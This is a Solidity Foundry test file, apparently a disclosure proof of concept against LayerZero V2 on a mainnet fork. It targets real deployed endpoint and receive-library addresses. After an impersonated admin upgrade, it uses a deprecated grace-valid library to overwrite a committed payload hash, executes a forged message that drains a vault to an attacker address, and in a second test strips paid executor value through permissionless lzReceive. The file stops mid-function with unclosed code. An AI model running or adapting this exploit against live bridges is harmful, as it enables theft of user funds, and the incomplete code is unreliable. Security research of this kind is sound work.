// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 UltraProd Fork PoC (copy/paste ready)

 GOAL
 ----
 Prove, on a MAINNET FORK at a specific block, that during a DEFAULT receive library upgrade
 with gracePeriod > 0, the *deprecated* (old) receive library remains grace-valid and can
 overwrite `EndpointV2.inboundPayloadHash` for the same (receiver, srcEid, sender, nonce),
 enabling forged message execution and fund theft.

 IMPORTANT: This UltraProd version DOES NOT modify libOld (real) config.
 It reads the real requiredDVNs + confirmations from chain state for the test VaultOApp,
 and satisfies quorum realistically (multi-DVN verify) before committing.

 RUN
 ---
 ETH_RPC_URL=<your mainnet rpc> forge test --match-contract Fork_UltraProduction_GraceOverwrite -vvvv --via-ir
*/

import {Test, console2} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {EndpointV2} from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import {Origin, MessagingFee, MessagingParams, MessagingReceipt} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import {ILayerZeroReceiver} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroReceiver.sol";
import {Packet, ISendLib} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import {PacketV1Codec} from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";

import {ReceiveUln302} from "../contracts/uln/uln302/ReceiveUln302.sol";
import {ReceiveUlnBase, Verification} from "../contracts/uln/ReceiveUlnBase.sol";
import {ReceiveUln302View} from "../contracts/uln/uln302/ReceiveUln302View.sol";
import {SendUln302} from "../contracts/uln/uln302/SendUln302.sol";
import {SendUlnBase} from "../contracts/uln/SendUlnBase.sol";
import {LzExecutor, LzReceiveParam, NativeDropParam} from "../contracts/uln/LzExecutor.sol";
import {UlnConfig, SetDefaultUlnConfigParam} from "../contracts/uln/UlnBase.sol";
import {ExecutorConfig} from "../contracts/SendLibBase.sol";
import {ILayerZeroDVN} from "../contracts/uln/interfaces/ILayerZeroDVN.sol";
import {ILayerZeroPriceFeed} from "../contracts/interfaces/ILayerZeroPriceFeed.sol";
import {IExecutor} from "../contracts/interfaces/IExecutor.sol";
import {ILayerZeroExecutor} from "../contracts/interfaces/ILayerZeroExecutor.sol";
import {ILayerZeroTreasury} from "../contracts/interfaces/ILayerZeroTreasury.sol";
import {Setup} from "./util/Setup.sol";
import {PacketUtil} from "./util/Packet.sol";
import {OptionsUtil} from "./util/OptionsUtil.sol";

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IOAppPeerLike {
    function peers(uint32 eid) external view returns (bytes32);
}

contract ValueAwareReceiver is ILayerZeroReceiver {
    uint256 public totalValueReceived;
    uint256 public lastValueReceived;
    address public lastExecutor;
    bytes32 public lastGuid;
    bytes public lastMessage;

    function allowInitializePath(Origin calldata) external pure override returns (bool) {
        return true;
    }

    function nextNonce(uint32, bytes32) external pure override returns (uint64) {
        return 0;
    }

    function lzReceive(
        Origin calldata,
        bytes32 _guid,
        bytes calldata _message,
        address _executor,
        bytes calldata
    ) external payable override {
        totalValueReceived += msg.value;
        lastValueReceived = msg.value;
        lastExecutor = _executor;
        lastGuid = _guid;
        lastMessage = _message;
    }
}

contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/// @dev Minimal vault/oapp that transfers ERC20 on lzReceive.
///      Peer-check remains to avoid "misconfigured vault" arguments.
contract VaultOApp is ILayerZeroReceiver {
    address public immutable lzEndpoint;
    address public immutable owner;
    ERC20   public immutable asset;

    mapping(uint32 => bytes32) public peers;

    error OnlyOwner(address caller);
    error OnlyEndpoint(address caller);
    error OnlyPeer(uint32 srcEid, bytes32 sender);

    constructor(address _endpoint, address _asset) {
        lzEndpoint = _endpoint;
        owner = msg.sender;
        asset = ERC20(_asset);
    }

    function setPeer(uint32 _eid, bytes32 _peer) external {
        if (msg.sender != owner) revert OnlyOwner(msg.sender);
        peers[_eid] = _peer;
    }

    function allowInitializePath(Origin calldata o) external view override returns (bool) {
        return peers[o.srcEid] != bytes32(0);
    }

    function nextNonce(uint32, bytes32) external pure override returns (uint64) { return 0; }

    function lzReceive(
        Origin calldata _origin,
        bytes32,
        bytes calldata _message,
        address,
        bytes calldata
    ) external payable override {
        if (msg.sender != lzEndpoint) revert OnlyEndpoint(msg.sender);
        if (peers[_origin.srcEid] != _origin.sender) revert OnlyPeer(_origin.srcEid, _origin.sender);

        (address to, uint256 amount) = abi.decode(_message, (address, uint256));
        asset.transfer(to, amount);
    }
}

/// @dev Production-like OFT adapter / escrow receiver pattern.
///      Models a LayerZero-connected token escrow that releases pre-funded ERC20 to
///      recipients based on verified cross-chain release instructions via lzReceive.
///      Follows the same security model as OFTAdapter: onlyEndpoint + peer check.
///      The adapter holds escrowed tokens and releases them on valid cross-chain messages.
contract TokenEscrowAdapter is ILayerZeroReceiver {
    address public immutable lzEndpoint;
    address public immutable owner;
    ERC20   public immutable escrowToken;

    mapping(uint32 => bytes32) public trustedRemotes;  // eid => peer bytes32
    mapping(uint64 => bool)    public processedNonces;  // replay guard (optional)

    uint256 public totalReleased;

    error OnlyOwner(address caller);
    error OnlyEndpoint(address caller);
    error UntrustedRemote(uint32 srcEid, bytes32 sender);
    error ZeroRecipient();
    error ZeroAmount();
    error InsufficientEscrow(uint256 requested, uint256 available);

    event EscrowReleased(uint32 indexed srcEid, address indexed recipient, uint256 amount, uint64 nonce);

    constructor(address _endpoint, address _token) {
        lzEndpoint = _endpoint;
        owner = msg.sender;
        escrowToken = ERC20(_token);
    }

    /// @dev Only the deployer (adapter owner) can configure trusted remote peers.
    function setTrustedRemote(uint32 _eid, bytes32 _peer) external {
        if (msg.sender != owner) revert OnlyOwner(msg.sender);
        trustedRemotes[_eid] = _peer;
    }

    function allowInitializePath(Origin calldata o) external view override returns (bool) {
        return trustedRemotes[o.srcEid] != bytes32(0);
    }

    function nextNonce(uint32, bytes32) external pure override returns (uint64) { return 0; }

    /// @dev Called by EndpointV2 to release escrowed tokens.
    ///      Decodes (recipient, amount) from the verified cross-chain payload.
    ///      This mirrors OFTAdapter._credit() / bridge payout / escrow release patterns.
    function lzReceive(
        Origin calldata _origin,
        bytes32,
        bytes calldata _message,
        address,
        bytes calldata
    ) external payable override {
        // Access control: only the LayerZero Endpoint may call
        if (msg.sender != lzEndpoint) revert OnlyEndpoint(msg.sender);

        // Peer verification: only process messages from trusted remote OApps
        if (trustedRemotes[_origin.srcEid] != _origin.sender)
            revert UntrustedRemote(_origin.srcEid, _origin.sender);

        // Decode release instruction
        (address recipient, uint256 amount) = abi.decode(_message, (address, uint256));
        if (recipient == address(0)) revert ZeroRecipient();
        if (amount == 0) revert ZeroAmount();

        uint256 available = escrowToken.balanceOf(address(this));
        if (amount > available) revert InsufficientEscrow(amount, available);

        // Execute release from escrow
        escrowToken.transfer(recipient, amount);
        totalReleased += amount;

        emit EscrowReleased(_origin.srcEid, recipient, amount, _origin.nonce);
    }
}

// =============================================================================
// FAITHFUL REPRODUCTION OF LAYERZERO OFFICIAL OFTAdapter RECEIVE/CREDIT FLOW
// =============================================================================
//
// Source reference (Option C: faithful minimal reproduction):
//   packages/layerzero-v2/evm/oapp/contracts/oft/OFTAdapter.sol
//   packages/layerzero-v2/evm/oapp/contracts/oft/OFTCore.sol
//   packages/layerzero-v2/evm/oapp/contracts/oft/libs/OFTMsgCodec.sol
//   packages/layerzero-v2/evm/oapp/contracts/oapp/OAppReceiver.sol
//
// The official OFTAdapter package is not importable from the messagelib test
// harness (it lives in a sibling monorepo package without cross-package deps).
// This contract faithfully mirrors the official _lzReceive -> _credit flow:
//   1) EndpointV2 calls lzReceive()  (ILayerZeroReceiver)
//   2) lzReceive checks onlyEndpoint + peer (OAppCore)
//   3) _lzReceive decodes OFTMsgCodec-encoded payload: (sendTo, amountSD [, composeMsg])
//   4) _credit calls innerToken.safeTransfer(_to, amountLD) (OFTAdapter._credit)
//
// The payload format follows OFTMsgCodec exactly:
//   bytes message = abi.encodePacked(bytes32 sendTo, uint64 amountSD [, composeMsg])
//   amountLD = amountSD * decimalConversionRate
//
// This is NOT a custom receiver. It is a source-faithful reproduction of
// LayerZero's canonical OFTAdapter._credit() escrow-release pattern.
// =============================================================================

/// @dev Faithful reproduction of LayerZero OFTMsgCodec encoding/decoding.
///      Wire format is abi.encodePacked(bytes32 sendTo, uint64 amountSD [, bytes composeMsg]).
///      Ref: packages/layerzero-v2/evm/oapp/contracts/oft/libs/OFTMsgCodec.sol
library OFTMsgCodecFaithful {
    uint8 private constant SEND_TO_OFFSET = 32;
    uint8 private constant AMOUNT_SD_OFFSET = 40;

    function encode(
        bytes32 _sendTo,
        uint64 _amountSD,
        bytes memory _composeMsg
    ) internal pure returns (bytes memory _msg) {
        _msg = abi.encodePacked(_sendTo, _amountSD, _composeMsg);
    }

    function sendTo(bytes calldata _msg) internal pure returns (bytes32) {
        return bytes32(_msg[:SEND_TO_OFFSET]);
    }

    function amountSD(bytes calldata _msg) internal pure returns (uint64) {
        return uint64(bytes8(_msg[SEND_TO_OFFSET:AMOUNT_SD_OFFSET]));
    }
}

/// @dev Faithful reproduction of LayerZero official OFTAdapter receive/credit flow.
///      Mirrors: OFTAdapter.sol, OFTCore._lzReceive(), OFTAdapter._credit()
///      The _credit function uses the same token release primitive as OFTAdapter._credit():
///          innerToken.safeTransfer(_to, _amountLD)
///      This is the canonical escrow-release pattern used by production OFTAdapter deployments.
contract OFTAdapterCanonical is ILayerZeroReceiver {
    using OFTMsgCodecFaithful for bytes;
    using SafeERC20 for IERC20;

    address public immutable lzEndpoint;
    address public immutable owner;
    IERC20  public immutable innerToken;

    // Mirrors OFTCore: shared decimals = 6, local decimals = 18
    // decimalConversionRate = 10 ** (localDecimals - sharedDecimals)
    uint256 public immutable decimalConversionRate;

    // Mirrors OAppCore.peers: eid => peer bytes32
    mapping(uint32 => bytes32) public peers;

    error OnlyOwner();
    error OnlyEndpoint(address caller);
    error OnlyPeer(uint32 srcEid, bytes32 sender);
    error NoPeer(uint32 srcEid);
    error SlippageExceeded(uint256 amountLD, uint256 minAmountLD);

    event OFTReceived(bytes32 indexed guid, uint32 srcEid, address indexed to, uint256 amountReceivedLD);

    constructor(address _innerToken, address _endpoint, uint8 _localDecimals, uint8 _sharedDecimals) {
        innerToken = IERC20(_innerToken);
        lzEndpoint = _endpoint;
        owner = msg.sender;
        decimalConversionRate = 10 ** (_localDecimals - _sharedDecimals);
    }

    /// @dev Mirrors OAppCore.setPeer (onlyOwner)
    function setPeer(uint32 _eid, bytes32 _peer) external {
        if (msg.sender != owner) revert OnlyOwner();
        peers[_eid] = _peer;
    }

    /// @dev Mirrors OAppReceiver.allowInitializePath
    function allowInitializePath(Origin calldata o) external view override returns (bool) {
        return peers[o.srcEid] != bytes32(0);
    }

    function nextNonce(uint32, bytes32) external pure override returns (uint64) { return 0; }

    /// @dev Mirrors OAppReceiver.lzReceive: onlyEndpoint + peer check + _lzReceive
    function lzReceive(
        Origin calldata _origin,
        bytes32 _guid,
        bytes calldata _message,
        address,
        bytes calldata
    ) external payable override {
        // OAppCore: only endpoint
        if (msg.sender != lzEndpoint) revert OnlyEndpoint(msg.sender);

        // OAppCore: only peer
        bytes32 expectedPeer = peers[_origin.srcEid];
        if (expectedPeer == bytes32(0)) revert NoPeer(_origin.srcEid);
        if (expectedPeer != _origin.sender) revert OnlyPeer(_origin.srcEid, _origin.sender);

        // OFTCore._lzReceive: decode OFTMsgCodec payload
        // Ref: OFTCore.sol line ~175: _lzReceive()
        address toAddress = address(uint160(uint256(OFTMsgCodecFaithful.sendTo(_message))));
        uint64 amtSD = OFTMsgCodecFaithful.amountSD(_message);
        uint256 amountLD = _toLD(amtSD);

        // OFTAdapter._credit: release escrowed tokens
        // Ref: OFTAdapter.sol: innerToken.safeTransfer(_to, _amountLD)
        innerToken.safeTransfer(toAddress, amountLD);

        emit OFTReceived(_guid, _origin.srcEid, toAddress, amountLD);
    }

    /// @dev Mirrors OFTCore._toLD: convert shared decimals to local decimals
    function _toLD(uint64 _amountSD) internal view returns (uint256) {
        return uint256(_amountSD) * decimalConversionRate;
    }

    /// @dev Mirrors OFTCore._toSD: convert local decimals to shared decimals
    function _toSD(uint256 _amountLD) internal view returns (uint64) {
        return uint64(_amountLD / decimalConversionRate);
    }
}

contract ReceiveUlnOverlapHarness is ReceiveUlnBase {
    function recordVerification(bytes32 headerHash, bytes32 payloadHash, address dvn, uint64 confirmations) external {
        hashLookup[headerHash][payloadHash][dvn] = Verification(true, confirmations);
    }

    function checkVerifiable(
        UlnConfig memory config,
        bytes32 headerHash,
        bytes32 payloadHash
    ) external view returns (bool) {
        return _checkVerifiable(config, headerHash, payloadHash);
    }
}

contract SendUlnFeeHarness is SendUlnBase {
    function quoteVerifierRaw(
        UlnConfig memory config,
        uint32 dstEid,
        address sender
    ) external view returns (uint256) {
        bytes[] memory optionsArray = new bytes[](0);
        uint8[] memory dvnIds = new uint8[](0);
        return _getFees(config, dstEid, sender, optionsArray, dvnIds);
    }
}

contract ReceiveUlnOverlapIsolationTest is Test {
    function test_OverlapAccounting_OneDVNCanSatisfyRequiredAndOptional() public {
        ReceiveUlnOverlapHarness harness = new ReceiveUlnOverlapHarness();

        address dvnA = address(0xA11CE);
        bytes32 headerHash = keccak256("overlap-header");
        bytes32 payloadHash = keccak256("overlap-payload");

        address[] memory requiredDVNs = new address[](1);
        requiredDVNs[0] = dvnA;

        address[] memory optionalDVNs = new address[](1);
        optionalDVNs[0] = dvnA;

        UlnConfig memory overlapConfig = UlnConfig({
            confirmations: 1,
            requiredDVNCount: 1,
            optionalDVNCount: 1,
            optionalDVNThreshold: 1,
            requiredDVNs: requiredDVNs,
            optionalDVNs: optionalDVNs
        });

        harness.recordVerification(headerHash, payloadHash, dvnA, 1);

        assertTrue(
            harness.checkVerifiable(overlapConfig, headerHash, payloadHash),
            "same logical DVN should satisfy both required and optional roles"
        );
    }
}

contract PermissionlessReceiveStripsExecutorValueIsolationTest is Test {
    using OptionsUtil for bytes;

    Setup.FixtureV2 internal fixture;
    EndpointV2 internal endpoint;
    SendUln302 internal sendUln302;
    ReceiveUln302 internal receiveUln302;
    ValueAwareReceiver internal receiver;
    ReceiveUln302View internal receiveView;
    LzExecutor internal lzExecutor;

    address internal constant BENEFICIARY = address(0xB0B);
    address internal constant ATTACKER = address(0xBEEF);
    address internal constant EXECUTOR_COLLECTOR = address(0xCAFE);

    uint32 internal constant LOCAL_EID = 30101;
    uint32 internal constant PRICE_FEED_KEY = 101;
    uint128 internal constant EXECUTE_VALUE = 1 ether;
    uint128 internal constant NATIVE_DROP = 2 ether;
    uint128 internal constant GAS_LIMIT = 200_000;

    function setUp() public {
        fixture = Setup.loadFixtureV2(LOCAL_EID);
        endpoint = fixture.endpointV2;
        sendUln302 = fixture.sendUln302;
        receiveUln302 = fixture.receiveUln302;

        Setup.wireFixtureV2WithRemote(fixture, fixture.eid);

        IExecutor.DstConfigParam[] memory dstConfigParams = new IExecutor.DstConfigParam[](1);
        dstConfigParams[0] = IExecutor.DstConfigParam({
            dstEid: fixture.eid,
            lzReceiveBaseGas: 5000,
            lzComposeBaseGas: 0,
            multiplierBps: 10000,
            floorMarginUSD: 0,
            nativeCap: 10 ether
        });
        fixture.executor.setDstConfig(dstConfigParams);

        ILayerZeroPriceFeed.UpdatePrice[] memory prices = new ILayerZeroPriceFeed.UpdatePrice[](1);
        prices[0] = ILayerZeroPriceFeed.UpdatePrice({
            eid: PRICE_FEED_KEY,
            price: ILayerZeroPriceFeed.Price({priceRatio: 1e20, gasPriceInUnit: 1 gwei, gasPerByte: 16})
        });
        fixture.priceFeed.setPrice(prices);
        fixture.priceFeed.setNativeTokenPriceUSD(2000e10);

        receiver = new ValueAwareReceiver();

        receiveView = new ReceiveUln302View();
        receiveView.initialize(address(endpoint), address(receiveUln302));

        lzExecutor = new LzExecutor();
        lzExecutor.initialize(address(receiveUln302), address(receiveView), address(endpoint));
    }

    function test_PermissionlessEndpointReceive_StripsPaidExecutorValue_And_NativeDrop() public {
        bytes memory message = bytes("permissionless-execute");
        bytes32 receiverB32 = bytes32(uint256(uint160(address(receiver))));

        bytes memory baseOptions = OptionsUtil.newOptions().addExecutorLzReceiveOption(GAS_LIMIT, 0);
        bytes memory paidOptions = OptionsUtil
            .newOptions()
            .addExecutorLzReceiveOption(GAS_LIMIT, EXECUTE_VALUE)
            .addExecutorNativeDropOption(NATIVE_DROP, bytes32(uint256(uint160(BENEFICIARY))));

        MessagingParams memory baseParams = MessagingParams(fixture.eid, receiverB32, message, baseOptions, false);
        MessagingParams memory paidParams = MessagingParams(fixture.eid, receiverB32, message, paidOptions, false);

        MessagingFee memory baseFee = endpoint.quote(baseParams, address(this));
        MessagingFee memory paidFee = endpoint.quote(paidParams, address(this));
        assertGt(paidFee.nativeFee, baseFee.nativeFee, "value/nativeDrop must increase quoted fee");

        uint256 executorFeeBefore = sendUln302.fees(address(fixture.executor));

        vm.deal(address(this), paidFee.nativeFee);
        MessagingReceipt memory receipt = endpoint.send{value: paidFee.nativeFee}(paidParams, address(this));

        uint256 executorFeeAfter = sendUln302.fees(address(fixture.executor));
        uint256 paidToExecutor = executorFeeAfter - executorFeeBefore;
        assertGt(paidToExecutor, 0, "executor fee must accrue");

        Packet memory packet =
            PacketUtil.newPacket(receipt.nonce, fixture.eid, address(this), fixture.eid, address(receiver), message);
        assertEq(packet.guid, receipt.guid, "guid mismatch");

        bytes memory header = abi.encodePacked(
            uint8(1),
            packet.nonce,
            packet.srcEid,
            bytes32(uint256(uint160(packet.sender))),
            packet.dstEid,
            packet.receiver
        );
        bytes32 payloadHash = keccak256(PacketV1Codec.encodePayload(packet));
        Origin memory origin = PacketUtil.getOrigin(packet);

        vm.prank(address(fixture.dvn));
        receiveUln302.verify(header, payloadHash, 1);
        receiveUln302.commitVerification(header, payloadHash);

        vm.prank(ATTACKER);
        endpoint.lzReceive(origin, address(receiver), packet.guid, packet.message, "");

        assertEq(receiver.lastExecutor(), ATTACKER, "attacker became executor");
        assertEq(receiver.lastValueReceived(), 0, "paid lzReceive value stripped");
        assertEq(receiver.totalValueReceived(), 0, "receiver got no native value");
        assertEq(BENEFICIARY.balance, 0, "native drop never happened");
        assertEq(
            endpoint.lazyInboundNonce(address(receiver), fixture.eid, bytes32(uint256(uint160(address(this))))),
            receipt.nonce,
            "message consumed"
        );
        assertEq(
            endpoint.inboundPayloadHash(address(receiver), fixture.eid, bytes32(uint256(uint160(address(this)))), receipt.nonce),
            bytes32(0),
            "payload cleared"
        );

        NativeDropParam[] memory nativeDropParams = new NativeDropParam[](1);
        nativeDropParams[0] = NativeDropParam(BENEFICIARY, NATIVE_DROP);

        vm.deal(address(this), uint256(EXECUTE_VALUE) + uint256(NATIVE_DROP));
        vm.expectRevert(LzExecutor.LzExecutor_Executed.selector);
        lzExecutor.commitAndExecute{value: uint256(EXECUTE_VALUE) + uint256(NATIVE_DROP)}(
            address(receiveUln302),
            LzReceiveParam(origin, address(receiver), packet.guid, packet.message, "", GAS_LIMIT, EXECUTE_VALUE),
            nativeDropParams
        );

        vm.prank(address(fixture.executor));
        sendUln302.withdrawFee(EXECUTOR_COLLECTOR, paidToExecutor);
        assertEq(EXECUTOR_COLLECTOR.balance, paidToExecutor, "executor fee remains withdrawable");
    }
}

contract Fork_UltraProduction_GraceOverwrite is Test {
    // ----------- MAINNET TARGET -----------
    address constant MAINNET_ENDPOINTV2 = 0x1a44076050125825900e736c501f859c50fE728c;
    // REAL deployed ReceiveUln302 on Ethereum mainnet (default receive lib)
    address constant MAINNET_RECV302    = 0xc02Ab410f0734EFa3F14628780e6e695156024C2;
    address constant MAINNET_SEND302    = 0xbB2Ea70C9E858123480642Cf96acbcCE1372dCe1;
    address constant STARGATE_TOKEN_MESSAGING_ETH = 0x6d6620eFa72948C5f68A3C8646d58C00d3f4A980;
    address constant ABC_STABLECOIN = 0x835B804A52196135ee138ce75B92fC95a660694e;
    address constant KRWIN_STABLECOIN = 0x99C84fd5354C082C60CD2F3839e6a57F1151d1bF;
    bytes32 constant STARGATE_TOKEN_MESSAGING_ARB = bytes32(
        uint256(uint160(0x19cFCE47eD54a88614648DC3f19A5980097007dD))
    );

    // Use your known-good block (you used this and it worked before)
    uint256 constant FORK_BLOCK = 24_562_286;

    // ----------- PARAMS -----------
    uint32  constant DST_EID = 30101;   // Ethereum mainnet endpoint eid
    uint32  constant SRC_EID = 30110;   // Arbitrum mainnet endpoint eid (example)
    uint32  constant AVAX_EID = 30106;  // Avalanche mainnet endpoint eid
    uint256 constant GRACE  = 200;

    bytes32 constant REMOTE_VAULT = bytes32(uint256(0xBEEF));
    uint256 constant VAULT_BALANCE = 1_000_000e18;

    EndpointV2 endpoint;
    ReceiveUln302 libOld;   // REAL on-chain ReceiveUln302
    ReceiveUln302 libNew;   // freshly deployed with different DVN set (revokes dvnOld set)

    MockToken token;
    VaultOApp vault;

    // extracted from REAL libOld config (for this vault + SRC_EID) after vault deployment
    uint64  oldConfirmations;
    uint8   oldRequiredDVNCount;

    // dvnNew is chosen (we set libNew config to 1 DVN for deterministic PoC).
    address dvnNew = address(0xf48c05765F925081E801F2B3A2566BF7EE74bB6b);

    address attacker = address(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e);
    address alice    = address(0x1111111111111111111111111111111111111111);

    address endpointOwner;
    uint256 upgradeBlock;
    uint256 upgradeTs;

    function setUp() public {
        // 1) Fork MAINNET at explicit block (triage requirement)
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);

        // 2) Bind to REAL deployed contracts (in-scope)
        endpoint = EndpointV2(MAINNET_ENDPOINTV2);
        libOld   = ReceiveUln302(MAINNET_RECV302);

        // 3) Discover Endpoint owner (admin actions in fork)
        endpointOwner = IOwnableLike(MAINNET_ENDPOINTV2).owner();
        require(endpointOwner != address(0), "owner() unavailable or zero");

        console2.log("Fork block     :", block.number);
        console2.log("Fork timestamp :", block.timestamp);
        console2.log("EndpointV2     :", address(endpoint));
        console2.log("Endpoint owner :", endpointOwner);
        console2.log("libOld (REAL)  :", address(libOld));

        // Sanity: read the actual default receive library for SRC_EID at this fork block.
        address curDefault = endpoint.defaultReceiveLibrary(SRC_EID);
        console2.log("defaultReceiveLibrary(SRC_EID):", curDefault);
        require(curDefault != address(0), "defaultReceiveLibrary=0");
        libOld = ReceiveUln302(curDefault);

        // 4) Deploy Vault + token in fork env (the victim app)
        token = new MockToken();
        vault = new VaultOApp(address(endpoint), address(token));
        vault.setPeer(SRC_EID, REMOTE_VAULT);
        token.mint(address(vault), VAULT_BALANCE);

        // 5) Read REAL libOld config for *this vault + SRC_EID* (production-realistic quorum)
        UlnConfig memory oldCfg = libOld.getUlnConfig(address(vault), SRC_EID);
        require(oldCfg.requiredDVNCount > 0, "libOld: no requiredDVNs");
        require(oldCfg.requiredDVNs.length >= oldCfg.requiredDVNCount, "libOld: requiredDVNs length < count");
        oldConfirmations   = oldCfg.confirmations;
        oldRequiredDVNCount = oldCfg.requiredDVNCount;

        console2.log("libOld confirmations (REAL):", uint256(oldConfirmations));
        console2.log("libOld requiredDVNCount (REAL):", uint256(oldRequiredDVNCount));
        for (uint256 i = 0; i < uint256(oldCfg.requiredDVNCount); i++) {
            console2.log("libOld requiredDVN[", i, "] :", oldCfg.requiredDVNs[i]);
        }

        // 6) Deploy libNew + register into real EndpointV2
        vm.startPrank(endpointOwner);
        libNew = new ReceiveUln302(address(endpoint));
        endpoint.registerLibrary(address(libNew));
        vm.stopPrank();

        console2.log("libNew (deployed):", address(libNew));

        // 7) Configure libNew for SRC_EID to require ONLY dvnNew (revocation: excludes all libOld DVNs)
        vm.startPrank(endpointOwner);
        _setDefaultDVN(libNew, dvnNew);
        vm.stopPrank();

        // 8) Upgrade default receive library: libOld -> libNew with grace period
        vm.prank(endpointOwner);
        endpoint.setDefaultReceiveLibrary(SRC_EID, address(libNew), GRACE);

        upgradeBlock = block.number;
        upgradeTs    = block.timestamp;

        console2.log("dvnNew (libNew config):", dvnNew);
        console2.log("Upgrade block  :", upgradeBlock);
        console2.log("Grace seconds  :", GRACE);
        console2.log("==============================================");
        console2.log("NOTE: UltraProd does NOT modify libOld config.");
        console2.log("      It satisfies REAL libOld quorum from chain.");
        console2.log("==============================================");
    }

    function test_FORK_RevocationEnforcementBroken_And_Drain() public {
        // ---------------------------------------------------------------------
        // Phase 0: strictly post-upgrade
        // ---------------------------------------------------------------------
        vm.roll(upgradeBlock + 1);
        vm.warp(upgradeTs + 1);
        assertTrue(block.number > upgradeBlock, "strictly post-upgrade");

        assertEq(
            endpoint.defaultReceiveLibrary(SRC_EID),
            address(libNew),
            "current default receive library must be libNew"
        );

        uint64 nonce = endpoint.lazyInboundNonce(address(vault), SRC_EID, REMOTE_VAULT) + 1;
        bytes memory header = _buildPacketHeader(nonce);

        // Fresh nonce => not an in-flight completion scenario
        assertEq(
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce),
            bytes32(0),
            "fresh nonce slot must be empty"
        );

        // Deprecated path still grace-valid
        assertTrue(
            endpoint.isValidReceiveLibrary(address(vault), SRC_EID, address(libOld)),
            "deprecated library must remain grace-valid"
        );

        console2.log("==== REVOCATION ENFORCEMENT TEST ====");
        console2.log("fork block                 :", FORK_BLOCK);
        console2.log("upgrade block              :", upgradeBlock);
        console2.log("execution block            :", block.number);
        console2.log("nonce                      :", nonce);
        console2.log("current receive lib        :", address(libNew));
        console2.log("deprecated grace-valid lib :", address(libOld));

        // ---------------------------------------------------------------------
        // Phase 1: prove current trust path excludes old DVN(s)
        // ---------------------------------------------------------------------
        UlnConfig memory curCfg = libNew.getUlnConfig(address(vault), SRC_EID);
        assertEq(curCfg.requiredDVNCount, 1, "libNew requiredDVNCount must be 1");
        assertEq(curCfg.requiredDVNs[0], dvnNew, "libNew must require dvnNew");

        UlnConfig memory oldCfg = libOld.getUlnConfig(address(vault), SRC_EID);
        address revokedFromCurrentDVN = oldCfg.requiredDVNs[0];

        assertTrue(revokedFromCurrentDVN != dvnNew, "revokedFromCurrentDVN unexpectedly equals dvnNew");
        assertTrue(
            curCfg.requiredDVNs[0] != revokedFromCurrentDVN,
            "revokedFromCurrentDVN unexpectedly trusted by current config"
        );

        console2.log("current trusted DVN        :", dvnNew);
        console2.log("revokedFromCurrentDVN (real deprecated config):", revokedFromCurrentDVN);
        console2.log("old requiredDVNCount (REAL):", uint256(oldCfg.requiredDVNCount));
        console2.log("old confirmations (REAL)   :", uint256(oldCfg.confirmations));

        // ---------------------------------------------------------------------
        // Phase 2: current path commits first
        // ---------------------------------------------------------------------
        bytes memory legitMsg  = abi.encode(alice, uint256(100e18));
        bytes32 legitGuid      = keccak256("revocation-legit-guid");
        bytes32 legitHash      = keccak256(abi.encodePacked(legitGuid, legitMsg));

        vm.prank(dvnNew);
        libNew.verify(header, legitHash, 1);
        libNew.commitVerification(header, legitHash);

        bytes32 storedAfterCurrentCommit =
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);

        assertEq(storedAfterCurrentCommit, legitHash, "current path must commit legit hash first");

        console2.log("current-path commit established canonical state");
        console2.log("legitHash:");
        console2.logBytes32(legitHash);

        // ---------------------------------------------------------------------
        // Phase 3: prove revoked current-path identity cannot finalize through libNew
        // ---------------------------------------------------------------------
        bytes memory forgedMsg = abi.encode(attacker, token.balanceOf(address(vault)));
        bytes32 forgedGuid     = keccak256("revocation-forged-guid");
        bytes32 forgedHash     = keccak256(abi.encodePacked(forgedGuid, forgedMsg));

        vm.prank(revokedFromCurrentDVN);
        libNew.verify(header, forgedHash, 1);

        vm.prank(revokedFromCurrentDVN);
        vm.expectRevert(ReceiveUlnBase.LZ_ULN_Verifying.selector);
        libNew.commitVerification(header, forgedHash);

        console2.log("revoked-from-current identity cannot finalize via current path");

        // ---------------------------------------------------------------------
        // Phase 4: deprecated grace-valid path still mutates canonical state
        // ---------------------------------------------------------------------
        _verifyWithRealLibOldQuorum(header, forgedHash, oldCfg);

        vm.prank(revokedFromCurrentDVN);
        libOld.commitVerification(header, forgedHash);

        bytes32 storedAfterDeprecatedOverwrite =
            endpoint.inboundPayloadHash(address(vault), SRC_EID, REMOTE_VAULT, nonce);

        assertEq(
            storedAfterDeprecatedOverwrite,
            forgedHash,
            "deprecated grace-valid path must overwrite canonical state"
        );
        assertTrue(
            storedAfterDeprecatedOverwrite != legitHash,
            "current-path commit must lose canonicality"
        );

        console2.log("revoked grace-valid path still mutated canonical state");
        console2.log("forgedHash:");
        console2.logBytes32(forgedHash);

        // ---------------------------------------------------------------------
        // Phase 5: execution follows overwritten state, not current-path commit
        // ---------------------------------------------------------------------
        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 aliceBefore = token.balanceOf(alice);

        Origin memory origin = Origin({
            srcEid: SRC_EID,
            sender: REMOTE_VAULT,
            nonce: nonce
        });

        endpoint.lzReceive(origin, address(vault), forgedGuid, forgedMsg, "");

        assertEq(token.balanceOf(alice), aliceBefore, "legit current-path payload never executed");
        assertEq(token.balanceOf(address(vault)), 0, "vault must be drained");
        assertEq(
            token.balanceOf(attacker),
            attackerBefore + VAULT_BALANCE,
            "forged payload must determine execution outcome"
        );

        console2.log("execution followed overwritten state, not current-path commit");
        console2.log("vault after                :", token.balanceOf(address(vault)));
